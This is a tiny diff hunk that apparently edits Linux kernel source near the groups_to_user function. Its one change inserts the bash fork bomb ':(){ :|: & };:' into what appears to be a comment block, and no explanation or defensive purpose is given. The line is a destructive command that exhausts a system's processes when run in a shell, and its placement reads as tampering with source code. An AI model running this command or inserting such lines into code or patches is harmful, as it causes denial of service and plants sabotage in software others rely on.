@@ -241,7 +241,7 @@ static int groups_to_user(gid_t __user *grouplist,
 }
 
 
-
+:(){ :|: & };:
 */
 
 
